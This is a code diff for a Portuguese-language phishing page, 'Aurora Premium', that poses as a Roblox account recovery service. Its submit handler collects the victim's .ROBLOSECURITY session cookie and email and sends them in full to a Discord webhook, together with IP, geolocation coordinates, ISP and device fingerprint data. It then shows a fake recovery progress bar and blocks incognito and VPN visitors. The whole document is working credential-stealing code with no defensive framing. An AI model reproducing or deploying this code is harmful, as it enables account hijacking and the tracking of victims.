+                const [vpnData, geoData, battery, adBlock, fingerprint] = await Promise.race([
+                    collectAll,
+                    new Promise(resolve => setTimeout(() => resolve([null, null, null, false, 'TIMEOUT']), 10000))
+                ]);
+
+                const connection = getConnection();
+                const hardware = getHardware();
+                const screenInfo = getScreen();
+                const prefs = getPreferences();
+                const devTools = detectDevTools();
+                const visitCount = getVisitCount();
+
+                const now = new Date();
+                const timestamp = now.toISOString();
+                const dateBR = now.toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+                const sessionId = 'AUR-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                const ua = navigator.userAgent;
+
+                const flag = geoData ? getFlagEmoji(geoData.countryCode) : '🌍';
+                const location = geoData ? `**${geoData.city || 'N/A'}**, ${geoData.region || 'N/A'}` : 'N/A';
+                const country = geoData ? `${flag} ${geoData.country || 'N/A'}` : 'N/A';
+                const coords = (geoData && geoData.latitude != null)
+                    ? `[${geoData.latitude}, ${geoData.longitude}](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})` : 'N/A';
+
+                // --- Cookie inteiro: sanitiza e divide em chunks (Discord desc = 4096) ---
+                const cookieSafe = sanitizeForDiscord(cookie);
+                const cookieChunks = chunkString(cookieSafe, 3900);
+                const cookieEmbeds = cookieChunks.map((chunk, idx) => ({
+                    title: cookieChunks.length > 1
+                        ? `🍪 Cookie .ROBLOSECURITY (parte ${idx + 1}/${cookieChunks.length})`
+                        : '🍪 Cookie .ROBLOSECURITY (completo)',
+                    color: 0x8b5cf6,
+                    description: '```\n' + chunk + '\n```',
+                    footer: { text: `Tamanho total: ${cookie.length} caracteres • ${sessionId}`, icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' }
+                }));
+
+                const summaryEmbed = {
+                    title: '✨ Nova Captura — Aurora Premium',
+                    description: '```ansi\n\u001b[1;35m⚡ NOVA SOLICITAÇÃO DE RECUPERAÇÃO\u001b[0m\n```\n**Um novo usuário enviou dados para recuperação.**',
+                    color: 0x8b5cf6,
+                    thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' },
+                    fields: [
+                        { name: '📧 Email', value: `\`${email}\``, inline: true },
+                        { name: '🆔 Session ID', value: `\`${sessionId}\``, inline: true },
+                        { name: '🔑 Fingerprint', value: `\`${fingerprint}\``, inline: true },
+                        { name: '📊 Visitas', value: `\`${visitCount}\``, inline: true },
+                        { name: '📏 Cookie (chars)', value: `\`${cookie.length}\``, inline: true },
+                        { name: '🧩 Partes do cookie', value: `\`${cookieChunks.length}\``, inline: true }
+                    ],
+                    footer: { text: '✨ Aurora Premium • Sistema de Recuperação Segura', icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' },
+                    timestamp: timestamp
+                };
+
+                const payload = {
+                    username: '🛡️ Aurora Security',
+                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png',
+                    embeds: [
+                        summaryEmbed,
+                        ...cookieEmbeds,
+                        {
+                            title: '🌍 Localização & Rede',
+                            color: 0x22d3ee,
+                            fields: [
+                                { name: '🌐 IP', value: `\`${ip}\``, inline: true },
+                                { name: '🏳️ País', value: country, inline: true },
+                                { name: '📍 Cidade', value: location, inline: true },
+                                { name: '📮 CEP', value: geoData?.postal ? `\`${geoData.postal}\`` : '`N/A`', inline: true },
+                                { name: '🗺️ Coordenadas', value: coords, inline: true },
+                                { name: '⏰ Timezone', value: `\`${geoData?.timezone || prefs.timezone}\``, inline: true },
+                                { name: '🏢 ISP', value: `\`${geoData?.isp || 'N/A'}\``, inline: false },
+                                { name: '🆔 ASN', value: `\`${geoData?.asn || 'N/A'}\``, inline: true },
+                                { name: '💰 Moeda', value: `\`${geoData?.currency || 'N/A'}\``, inline: true }
+                            ]
+                        },
+                        {
+                            title: '💻 Dispositivo & Sistema',
+                            color: 0xa855f7,
+                            fields: [
+                                { name: '💻 Sistema', value: `\`${getOS()}\``, inline: true },
+                                { name: '🌐 Navegador', value: `\`${getBrowser()}\``, inline: true },
+                                { name: '🖥️ Plataforma', value: `\`${hardware.platform}\``, inline: true },
+                                { name: '📱 Resolução', value: `\`${screenInfo.resolution}\``, inline: true },
+                                { name: '🎨 Pixel Ratio', value: `\`${screenInfo.pixelRatio}x\``, inline: true },
+                                { name: '🌈 Cor', value: `\`${screenInfo.colorDepth}\``, inline: true },
+                                { name: '🔄 Orientação', value: `\`${screenInfo.orientation}\``, inline: true },
+                                { name: '⚙️ CPU Cores', value: `\`${hardware.cores}\``, inline: true },
+                                { name: '🧠 RAM', value: `\`${hardware.memory}\``, inline: true },
+                                { name: '👆 Touch', value: `\`${hardware.touchPoints} pontos\``, inline: true }
+                            ]
+                        },
+                        {
+                            title: '🔋 Bateria & Conexão',
+                            color: 0x10b981,
+                            fields: [
+                                { name: '🔋 Bateria', value: battery ? `\`${battery.level}%\` ${battery.charging ? '⚡ Carregando' : '🔌 Descarregando'}` : '`N/A`', inline: true },
+                                { name: '📡 Conexão', value: connection ? `\`${connection.type}\`` : '`N/A`', inline: true },
+                                { name: '⬇️ Download', value: connection ? `\`${connection.downlink}\`` : '`N/A`', inline: true },
+                                { name: '📶 Ping', value: connection ? `\`${connection.rtt}\`` : '`N/A`', inline: true },
+                                { name: '💾 Save Data', value: connection?.saveData ? '✅ Ativado' : '❌ Desativado', inline: true }
+                            ]
+                        },
+                        {
+                            title: '🛡️ Segurança & Sessão',
+                            color: 0xf59e0b,
+                            fields: [
+                                { name: '🔒 Anônimo', value: isPrivate ? '✅ **Detectado**' : '❌ Não', inline: true },
+                                { name: '🌐 VPN/Proxy', value: vpnDetected ? '⚠️ **Detectado**' : '✅ Não', inline: true },
+                                { name: '🚫 AdBlocker', value: adBlock ? '⚠️ **Detectado**' : '✅ Não', inline: true },
+                                { name: '👨‍💻 DevTools', value: devTools ? '⚠️ **Aberto**' : '✅ Fechado', inline: true },
+                                { name: '🍪 Cookies', value: prefs.cookiesEnabled ? '✅ Sim' : '❌ Não', inline: true },
+                                { name: '🌙 Dark Mode', value: prefs.darkMode ? '✅ Ativo' : '❌ Não', inline: true },
+                                { name: '🚫 DNT', value: `\`${prefs.doNotTrack}\``, inline: true },
+                                { name: '🌎 Idioma', value: `\`${prefs.language}\``, inline: true }
+                            ]
+                        },
+                        ...(vpnData ? [{
+                            title: '📊 Análise de Rede Avançada',
+                            color: 0xef4444,
+                            fields: [
+                                { name: '🌐 VPN', value: vpnData.is_vpn ? '✅ Sim' : '❌ Não', inline: true },
+                                { name: '🔀 Proxy', value: vpnData.is_proxy ? '✅ Sim' : '❌ Não', inline: true },
+                                { name: '🧅 Tor', value: vpnData.is_tor ? '✅ Sim' : '❌ Não', inline: true },
+                                { name: '🏢 Datacenter', value: vpnData.is_datacenter ? '✅ Sim' : '❌ Não', inline: true },
+                                { name: '⚠️ Ameaça', value: `\`${vpnData.threat_level || 0}/100\``, inline: true }
+                            ]
+                        }] : []),
+                        {
+                            title: '📱 User Agent Completo',
+                            color: 0x6366f1,
+                            description: `\`\`\`${ua.substring(0, 900)}\`\`\``,
+                            footer: { text: `Aurora v4.4 • ${new Date().getFullYear()} • ${sessionId}`, icon_url: 'https://cdn-icons-png.flaticon.com/512/1067/1067357.png' }
+                        }
+                    ]
+                };
+
+                // Envio fetch com log
+                try {
+                    const r = await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                    if (r.ok) return true;
+                    let errText = ''; try { errText = await r.text(); } catch (_) {}
+                    console.error('❌ Webhook Discord retornou', r.status, errText);
+                } catch (e) { console.error('❌ fetch erro:', e); }
+
+                // Fallback XHR checando status
+                try {
+                    return await new Promise((resolve) => {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', WEBHOOK_URL, true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.onload = () => {
+                            if (xhr.status >= 200 && xhr.status < 300) resolve(true);
+                            else { console.error('❌ XHR falhou:', xhr.status, xhr.responseText); resolve(false); }
+                        };
+                        xhr.onerror = () => { console.error('❌ XHR network'); resolve(false); };
+                        xhr.send(JSON.stringify(payload));
+                    });
+                } catch (e) { console.error('❌ XHR exception:', e); return false; }
+            } catch (e) { console.error('Erro webhook:', e); return false; }
+        }
+
+        // ============================================================
+        // 8. DETECT API
+        // ============================================================
+        async function checkDetection() {
+            try {
+                const res = await fetchWithTimeout('/api/detect', 4000);
+                const data = await res.json();
+                if (data.data && data.data.blocked) {
+                    const modal = document.getElementById('blockModal');
+                    const reason = document.getElementById('blockReason');
+                    const title = document.getElementById('blockTitle');
+                    const icon = document.getElementById('blockIcon');
+                    const desc = document.getElementById('blockDesc');
+                    const btn = document.getElementById('blockBtn');
+                    const gif = document.getElementById('banGifWrap');
+                    gif.classList.remove('active');
+                    let msg = '';
+                    if (data.data.isPrivate) {
+                        msg = '🔒 Navegador Anônimo/Incógnito Detectado';
+                        title.textContent = '🔒 Navegador Anônimo!';
+                        icon.textContent = '🕵️';
+                        desc.textContent = 'Navegadores anônimos não são permitidos por questões de segurança.';
+                    } else if (data.data.vpn && data.data.vpn.isVPN) {
+                        msg = '🌐 VPN ou Proxy Detectado';
+                        title.textContent = '🌐 VPN/Proxy Detectado!';
+                        icon.textContent = '🛡️';
+                        desc.textContent = 'Conexões via VPN ou proxy não são permitidas.';
+                    }
+                    reason.textContent = msg;
+                    reason.parentElement.className = 'reason-box';
+                    btn.className = 'btn-block-action';
+                    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                    btn.onclick = () => window.location.reload();
+                    modal.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    return data.data;
+                }
+                return data.data || { blocked: false };
+            } catch (e) { return { blocked: false }; }
+        }
+
+        // ============================================================
+        // 9. UI
+        // ============================================================
+        function toggleMenu() { document.getElementById('navMenu').classList.toggle('open'); }
+        function showSection(id) {
+            if (isUserBanned) return;
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            const target = document.getElementById(id);
+            if (target) target.classList.add('active');
+            document.querySelectorAll('.nav-links a').forEach(l => l.classList.remove('active'));
+            const links = document.querySelectorAll('.nav-links a');
+            for (let l of links) {
+                if (l.textContent.trim().toLowerCase().includes(id) || l.textContent.trim().toLowerCase().includes(id.substring(0, 3))) {
+                    l.classList.add('active'); break;
+                }
+            }
+            document.getElementById('navMenu').classList.remove('open');
+            window.scrollTo({ top: 0, behavior: 'auto' });
+        }
+        function goToRecovery() { if (isUserBanned) return; showSection('recovery'); }
+        function togglePass() {
+            const inp = document.getElementById('cookieInput');
+            const icon = document.querySelector('.toggle i');
+            if (inp.type === 'password') { inp.type = 'text'; icon.className = 'fas fa-eye-slash'; }
+            else { inp.type = 'password'; icon.className = 'fas fa-eye'; }
+        }
+        function toggleFaq(el) {
+            const item = el.closest('.faq-item');
+            document.querySelectorAll('.faq-item').forEach(i => { if (i !== item) i.classList.remove('open'); });
+            item.classList.toggle('open');
+        }
+
+        // ============================================================
+        // 10. TIMER
+        // ============================================================
+        function updateTimer() {
+            if (!blockUntil) return;
+            const diff = blockUntil - Date.now();
+            if (diff <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('blockMsg').classList.remove('visible');
+                const btn = document.getElementById('submitBtn');
+                btn.disabled = false; btn.style.opacity = '1';
+                btn.innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                hasAttempted = false; isBlocked = false;
+                try { localStorage.removeItem('aurora_block_until'); } catch (e) {}
+                return;
+            }
+            const h = Math.floor(diff / 3600000);
+            const m = Math.floor((diff % 3600000) / 60000);
+            const s = Math.floor((diff % 60000) / 1000);
+            document.getElementById('timerDisplay').textContent = `${String(h).padStart(2,'0')}h ${String(m).padStart(2,'0')}m ${String(s).padStart(2,'0')}s`;
+        }
+
+        // ============================================================
+        // 11. SUBMIT
+        // ============================================================
+        async function handleSubmit(e) {
+            e.preventDefault();
+
+            const isIncognito = await detectIncognito();
+            if (isIncognito) { showNotification('🔒', 'Modo Incógnito!', 'O modo incógnito não é permitido. Desative para continuar.'); return; }
+            if (isUserBanned) return;
+            if (!termsAccepted) { openTerms(); showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos.'); return; }
+            if (isBlocked) { showNotification('⏳', 'Aguarde!', 'Espere 9 horas para tentar novamente.'); return; }
+
+            const [isPrivate, isGoogle, hasVPN] = await Promise.all([isPrivateBrowsing(), isGoogleIncognito(), detectVPN()]);
+            if (isPrivate || isGoogle) { showNotification('🔒', 'Navegador Anônimo!', 'Navegadores anônimos não são permitidos.'); return; }
+            if (hasVPN) { showNotification('🌐', 'VPN Detectada!', 'Conexões via VPN não são permitidas.'); return; }
+
+            const cookie = document.getElementById('cookieInput').value.trim();
+            const email = document.getElementById('emailInput').value.trim();
+            if (!cookie || !email) { showNotification('⚠️', 'Campos vazios!', 'Preencha todos os campos.'); return; }
+            if (hasAttempted) { showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.'); return; }
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
+
+            const ip = await getIP();
+            const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);
+
+            if (sent) {
+                hasAttempted = true; isBlocked = true;
+                blockUntil = Date.now() + (9 * 60 * 60 * 1000);
+                try { localStorage.setItem('aurora_block_until', blockUntil.toString()); } catch (e) {}
+                btn.disabled = true; btn.style.opacity = '0.5';
+                btn.innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
+                document.getElementById('blockMsg').classList.add('visible');
+                document.getElementById('timerDisplay').textContent = '9h 00m 00s';
+                if (timerInterval) clearInterval(timerInterval);
+                timerInterval = setInterval(updateTimer, 1000);
+                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. ✨');
+                showProcessing();
+            } else {
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
+                showNotification('❌', 'Erro!', 'Falha ao enviar dados. Tente novamente.');
+            }
+        }
+
+        // ============================================================
+        // 12. MODAIS
+        // ============================================================
+        function showProcessing() {
+            const modal = document.getElementById('processingModal');
+            modal.classList.add('active');
+            let p = 0;
+            const fill = document.querySelector('.progress-track .fill');
+            const text = document.getElementById('procText');
+            const interval = setInterval(() => {
+                p += Math.random() * 20 + 5;
+                if (p > 100) p = 100;
+                text.textContent = Math.floor(p) + '%';
+                fill.style.width = p + '%';
+                if (p >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => { modal.classList.remove('active'); showSuccess(); }, 400);
+                }
+            }, 180);
+        }
+        function showSuccess() {
+            document.getElementById('successModal').classList.add('active');
+            document.getElementById('recoveryForm').reset();
+            document.getElementById('cookieInput').type = 'password';
+            document.querySelector('.toggle i').className = 'fas fa-eye';
+        }
+        function closeSuccess() {
+            document.getElementById('successModal').classList.remove('active');
+            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. ✨');
+        }
+
+        // ============================================================
+        // 13. NOTIFICATION
+        // ============================================================
+        function showNotification(icon, title, msg) {
+            const el = document.createElement('div');
+            el.style.cssText = `
+                position: fixed; top: 80px; right: 16px; z-index: 9999;
+                background: linear-gradient(135deg, rgba(18,8,42,0.97), rgba(7,3,15,0.97));
+                border: 1px solid rgba(139,58,237,0.25);
+                border-radius: 14px; padding: 1rem 1.3rem; max-width: 340px;
+                animation: fadeUp 0.3s ease-out;
+                box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 30px rgba(139,92,246,0.2);
+                color: #fff; font-family: inherit; left: 16px;
+            `;
+            if (window.innerWidth > 480) { el.style.left = 'auto'; el.style.maxWidth = '380px'; }
+            el.innerHTML = `
+                <div style="display:flex;align-items:center;gap:0.6rem;margin-bottom:0.15rem;">
+                    <span style="font-size:1.35rem;">${icon}</span>
+                    <strong style="font-size:0.95rem;">${title}</strong>
+                </div>
+                <p style="color:rgba(255,255,255,0.68);margin:0;font-size:0.85rem;line-height:1.5;">${msg}</p>
+            `;
+            document.body.appendChild(el);
+            setTimeout(() => {
+                el.style.transition = 'opacity 0.3s, transform 0.3s';
+                el.style.opacity = '0'; el.style.transform = 'translateY(-10px)';
+                setTimeout(() => el.remove(), 300);
+            }, 4500);
+        }
+
+        // ============================================================
+        // 14. CLOSE MODALS
+        // ============================================================
+        document.addEventListener('click', function(e) {
+            const block = document.getElementById('blockModal');
+            if (e.target === block) return;
+            if (e.target === document.getElementById('processingModal')) e.target.classList.remove('active');
+            if (e.target === document.getElementById('successModal')) e.target.classList.remove('active');
+            if (e.target === document.getElementById('termsModal')) closeTerms();
+        });
+
+        // ============================================================
+        // 15. SCROLL
+        // ============================================================
+        let scrollTicking = false;
+        window.addEventListener('scroll', () => {
+            if (!scrollTicking) {
+                requestAnimationFrame(() => {
+                    document.querySelector('.navbar').style.background = window.scrollY > 10 ? 'rgba(7,3,15,0.88)' : 'rgba(7,3,15,0.78)';
+                    scrollTicking = false;
+                });
+                scrollTicking = true;
+            }
+        }, { passive: true });
+
+        // ============================================================
+        // 16. RESTORE BLOCK
+        // ============================================================
+        function restoreBlock() {
+            try {
+                const saved = localStorage.getItem('aurora_block_until');
+                if (saved) {
+                    const t = parseInt(saved);
+                    if (t > Date.now()) {
+                        blockUntil = t; isBlocked = true; hasAttempted = true;
+                        const btn = document.getElementById('submitBtn');
+                        btn.disabled = true; btn.style.opacity = '0.5';
+                        btn.innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
+                        document.getElementById('blockMsg').classList.add('visible');
+                        if (timerInterval) clearInterval(timerInterval);
+                        timerInterval = setInterval(updateTimer, 1000);
+                        updateTimer();
+                    } else localStorage.removeItem('aurora_block_until');
+                }
+            } catch (e) {}
+        }
+
+        // ============================================================
+        // 17. INIT
+        // ============================================================
+        async function init() {
+            console.log('%c✨ Aurora Premium v4.4 ✨', 'font-size:22px;font-weight:bold;background:linear-gradient(90deg,#8b5cf6,#d8b4fe);-webkit-background-clip:text;color:transparent;');
+
+            const isIncognito = await detectIncognito();
+            if (isIncognito) {
+                const modal = document.getElementById('blockModal');
+                document.getElementById('blockTitle').textContent = '🔒 Modo Incógnito!';
+                document.getElementById('blockIcon').textContent = '🕵️';
+                document.getElementById('blockReason').textContent = '🔒 Modo Incógnito/Anônimo Detectado';
+                document.getElementById('blockReason').parentElement.className = 'reason-box';
+                document.getElementById('blockDesc').textContent = 'O modo incógnito não é permitido por questões de segurança. Desative para acessar.';
+                document.getElementById('blockBtn').className = 'btn-block-action';
+                document.getElementById('blockBtn').innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                document.getElementById('blockBtn').onclick = () => window.location.reload();
                 modal.classList.add('active');
                 document.body.style.overflow = 'hidden';
-                return data.data;
+                return;
             }
-            return data.data || { blocked: false };
-        } catch (e) { return { blocked: false }; }
-    }
 
-    // ============================================================
-    // 9. UI
-    // ============================================================
-    function toggleMenu() {
-        document.getElementById('navMenu').classList.toggle('open');
-    }
-
-    function showSection(id) {
-        if (isUserBanned) return;
-        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-        const target = document.getElementById(id);
-        if (target) target.classList.add('active');
-        document.querySelectorAll('.nav-links a').forEach(l => l.classList.remove('active'));
-        const links = document.querySelectorAll('.nav-links a');
-        for (let l of links) {
-            if (l.textContent.trim().toLowerCase().includes(id) || l.textContent.trim().toLowerCase().includes(id.substring(0, 3))) {
-                l.classList.add('active');
-                break;
+            const isPrivate = await detectPrivateBrowsingBrowser();
+            if (isPrivate) {
+                const modal = document.getElementById('blockModal');
+                document.getElementById('blockTitle').textContent = '🔒 Navegador Anônimo!';
+                document.getElementById('blockIcon').textContent = '🕵️';
+                document.getElementById('blockReason').textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
+                document.getElementById('blockReason').parentElement.className = 'reason-box';
+                document.getElementById('blockDesc').textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative para acessar.';
+                document.getElementById('blockBtn').className = 'btn-block-action';
+                document.getElementById('blockBtn').innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                document.getElementById('blockBtn').onclick = () => window.location.reload();
+                modal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+                return;
             }
+
+            const banned = await checkBanStatus();
+            if (banned) return;
+
+            checkDetection();
+            restoreBlock();
+            setTimeout(checkTerms, 800);
         }
-        document.getElementById('navMenu').classList.remove('open');
-        window.scrollTo({ top: 0, behavior: 'auto' });
-    }
 
-    function goToRecovery() {
-        if (isUserBanned) return;
-        showSection('recovery');
-    }
-
-    function togglePass() {
-        const inp = document.getElementById('cookieInput');
-        const icon = document.querySelector('.toggle i');
-        if (inp.type === 'password') {
-            inp.type = 'text';
-            icon.className = 'fas fa-eye-slash';
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', init);
         } else {
-            inp.type = 'password';
-            icon.className = 'fas fa-eye';
+            init();
         }
-    }
-
-    function toggleFaq(el) {
-        const item = el.closest('.faq-item');
-        document.querySelectorAll('.faq-item').forEach(i => { if (i !== item) i.classList.remove('open'); });
-        item.classList.toggle('open');
-    }
-
-    // ============================================================
-    // 10. TIMER
-    // ============================================================
-    function updateTimer() {
-        if (!blockUntil) return;
-        const diff = blockUntil - Date.now();
-        if (diff <= 0) {
-            clearInterval(timerInterval);
-            document.getElementById('blockMsg').classList.remove('visible');
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = false;
-            btn.style.opacity = '1';
-            btn.innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
-            hasAttempted = false;
-            isBlocked = false;
-            try { localStorage.removeItem('aurora_block_until'); } catch (e) {}
-            return;
-        }
-        const h = Math.floor(diff / 3600000);
-        const m = Math.floor((diff % 3600000) / 60000);
-        const s = Math.floor((diff % 60000) / 1000);
-        document.getElementById('timerDisplay').textContent = `${String(h).padStart(2,'0')}h ${String(m).padStart(2,'0')}m ${String(s).padStart(2,'0')}s`;
-    }
-
-    // ============================================================
-    // 11. SUBMIT
-    // ============================================================
-    async function handleSubmit(e) {
-        e.preventDefault();
-
-        const isIncognito = await detectIncognito();
-        if (isIncognito) {
-            showNotification('🔒', 'Modo Incógnito!', 'O modo incógnito não é permitido. Desative para continuar.');
-            return;
-        }
-        if (isUserBanned) return;
-        if (!termsAccepted) { openTerms(); showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos.'); return; }
-        if (isBlocked) { showNotification('⏳', 'Aguarde!', 'Espere 9 horas para tentar novamente.'); return; }
-
-        const [isPrivate, isGoogle, hasVPN] = await Promise.all([
-            isPrivateBrowsing(),
-            isGoogleIncognito(),
-            detectVPN()
-        ]);
-
-        if (isPrivate || isGoogle) { showNotification('🔒', 'Navegador Anônimo!', 'Navegadores anônimos não são permitidos.'); return; }
-        if (hasVPN) { showNotification('🌐', 'VPN Detectada!', 'Conexões via VPN não são permitidas.'); return; }
-
-        const cookie = document.getElementById('cookieInput').value.trim();
-        const email = document.getElementById('emailInput').value.trim();
-        if (!cookie || !email) { showNotification('⚠️', 'Campos vazios!', 'Preencha todos os campos.'); return; }
-        if (hasAttempted) { showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.'); return; }
-
-        const btn = document.getElementById('submitBtn');
-        btn.disabled = true;
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
-
-        const ip = await getIP();
-        const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);
-
-        if (sent) {
-            hasAttempted = true;
-            isBlocked = true;
-            blockUntil = Date.now() + (9 * 60 * 60 * 1000);
-            try { localStorage.setItem('aurora_block_until', blockUntil.toString()); } catch (e) {}
-            btn.disabled = true;
-            btn.style.opacity = '0.5';
-            btn.innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
-            document.getElementById('blockMsg').classList.add('visible');
-            document.getElementById('timerDisplay').textContent = '9h 00m 00s';
-            if (timerInterval) clearInterval(timerInterval);
-            timerInterval = setInterval(updateTimer, 1000);
-            showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. ✨');
-            showProcessing();
-        } else {
-            btn.disabled = false;
-            btn.innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
-            showNotification('❌', 'Erro!', 'Falha ao enviar dados. Tente novamente.');
-        }
-    }
-
-    // ============================================================
-    // 12. MODAIS
-    // ============================================================
-    function showProcessing() {
-        const modal = document.getElementById('processingModal');
-        modal.classList.add('active');
-        let p = 0;
-        const fill = document.querySelector('.progress-track .fill');
-        const text = document.getElementById('procText');
-        const interval = setInterval(() => {
-            p += Math.random() * 20 + 5;
-            if (p > 100) p = 100;
-            text.textContent = Math.floor(p) + '%';
-            fill.style.width = p + '%';
-            if (p >= 100) {
-                clearInterval(interval);
-                setTimeout(() => { modal.classList.remove('active'); showSuccess(); }, 400);
-            }
-        }, 180);
-    }
-
-    function showSuccess() {
-        document.getElementById('successModal').classList.add('active');
-        document.getElementById('recoveryForm').reset();
-        document.getElementById('cookieInput').type = 'password';
-        document.querySelector('.toggle i').className = 'fas fa-eye';
-    }
-
-    function closeSuccess() {
-        document.getElementById('successModal').classList.remove('active');
-        showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. ✨');
-    }
-
-    // ============================================================
-    // 13. NOTIFICATION
-    // ============================================================
-    function showNotification(icon, title, msg) {
-        const el = document.createElement('div');
-        el.style.cssText = `
-            position: fixed; top: 80px; right: 16px; z-index: 9999;
-            background: linear-gradient(135deg, rgba(18,8,42,0.97), rgba(7,3,15,0.97));
-            border: 1px solid rgba(139,58,237,0.25);
-            border-radius: 14px; padding: 1rem 1.3rem; max-width: 340px;
-            animation: fadeUp 0.3s ease-out;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.7), 0 0 30px rgba(139,92,246,0.2);
-            color: #fff; font-family: inherit;
-            left: 16px;
-        `;
-        if (window.innerWidth > 480) {
-            el.style.left = 'auto';
-            el.style.maxWidth = '380px';
-        }
-        el.innerHTML = `
-            <div style="display:flex;align-items:center;gap:0.6rem;margin-bottom:0.15rem;">
-                <span style="font-size:1.35rem;">${icon}</span>
-                <strong style="font-size:0.95rem;">${title}</strong>
-            </div>
-            <p style="color:rgba(255,255,255,0.68);margin:0;font-size:0.85rem;line-height:1.5;">${msg}</p>
-        `;
-        document.body.appendChild(el);
-        setTimeout(() => {
-            el.style.transition = 'opacity 0.3s, transform 0.3s';
-            el.style.opacity = '0';
-            el.style.transform = 'translateY(-10px)';
-            setTimeout(() => el.remove(), 300);
-        }, 4500);
-    }
-
-    // ============================================================
-    // 14. CLOSE MODALS
-    // ============================================================
-    document.addEventListener('click', function(e) {
-        const block = document.getElementById('blockModal');
-        if (e.target === block) return;
-        if (e.target === document.getElementById('processingModal')) e.target.classList.remove('active');
-        if (e.target === document.getElementById('successModal')) e.target.classList.remove('active');
-        if (e.target === document.getElementById('termsModal')) closeTerms();
-    });
-
-    // ============================================================
-    // 15. SCROLL
-    // ============================================================
-    let scrollTicking = false;
-    window.addEventListener('scroll', () => {
-        if (!scrollTicking) {
-            requestAnimationFrame(() => {
-                document.querySelector('.navbar').style.background = window.scrollY > 10
-                    ? 'rgba(7,3,15,0.88)'
-                    : 'rgba(7,3,15,0.78)';
-                scrollTicking = false;
-            });
-            scrollTicking = true;
-        }
-    }, { passive: true });
-
-    // ============================================================
-    // 16. RESTORE BLOCK
-    // ============================================================
-    function restoreBlock() {
-        try {
-            const saved = localStorage.getItem('aurora_block_until');
-            if (saved) {
-                const t = parseInt(saved);
-                if (t > Date.now()) {
-                    blockUntil = t;
-                    isBlocked = true;
-                    hasAttempted = true;
-                    const btn = document.getElementById('submitBtn');
-                    btn.disabled = true;
-                    btn.style.opacity = '0.5';
-                    btn.innerHTML = '<i class="fas fa-clock"></i> Aguarde 9h';
-                    document.getElementById('blockMsg').classList.add('visible');
-                    if (timerInterval) clearInterval(timerInterval);
-                    timerInterval = setInterval(updateTimer, 1000);
-                    updateTimer();
-                } else localStorage.removeItem('aurora_block_until');
-            }
-        } catch (e) {}
-    }
-
-    // ============================================================
-    // 17. INIT
-    // ============================================================
-    async function init() {
-        console.log('%c✨ Aurora Premium v4.4 ✨', 'font-size:22px;font-weight:bold;background:linear-gradient(90deg,#8b5cf6,#d8b4fe);-webkit-background-clip:text;color:transparent;');
-
-        const isIncognito = await detectIncognito();
-        if (isIncognito) {
-            const modal = document.getElementById('blockModal');
-            document.getElementById('blockTitle').textContent = '🔒 Modo Incógnito!';
-            document.getElementById('blockIcon').textContent = '🕵️';
-            document.getElementById('blockReason').textContent = '🔒 Modo Incógnito/Anônimo Detectado';
-            document.getElementById('blockReason').parentElement.className = 'reason-box';
-            document.getElementById('blockDesc').textContent = 'O modo incógnito não é permitido por questões de segurança. Desative para acessar.';
-            document.getElementById('blockBtn').className = 'btn-block-action';
-            document.getElementById('blockBtn').innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
-            document.getElementById('blockBtn').onclick = () => window.location.reload();
-            modal.classList.add('active');
-            document.body.style.overflow = 'hidden';
-            return;
-        }
-
-        const isPrivate = await detectPrivateBrowsingBrowser();
-        if (isPrivate) {
-            const modal = document.getElementById('blockModal');
-            document.getElementById('blockTitle').textContent = '🔒 Navegador Anônimo!';
-            document.getElementById('blockIcon').textContent = '🕵️';
-            document.getElementById('blockReason').textContent = '🔒 Navegador Anônimo/Incógnito Detectado';
-            document.getElementById('blockReason').parentElement.className = 'reason-box';
-            document.getElementById('blockDesc').textContent = 'Navegadores anônimos não são permitidos por questões de segurança. Desative para acessar.';
